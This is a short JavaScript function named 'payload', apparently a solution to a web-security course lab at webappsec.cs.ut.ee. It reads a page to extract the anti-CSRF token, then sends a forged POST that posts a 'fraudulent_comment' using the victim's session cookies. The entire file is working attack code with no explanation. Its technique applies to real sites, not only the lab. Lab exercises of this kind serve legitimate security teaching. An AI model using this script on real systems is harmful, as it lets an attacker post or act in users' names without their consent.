async function payload() {
  const token = await fetch("https://webappsec.cs.ut.ee/csrf/comments_token.php")
    .then((value) => value.text())
    .then((text) => new DOMParser().parseFromString(text, 'text/html'))
    .then((dom) => dom.getElementsByName("csrf_token")[0].attributes.getNamedItem("value").nodeValue);
  fetch("https://webappsec.cs.ut.ee/csrf/comments_token.php", {
    method: 'POST',
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    mode: "same-origin",
    body: 'comment=fraudulent_comment&csrf_token=' + token,
    credentials: "include"
  })
}
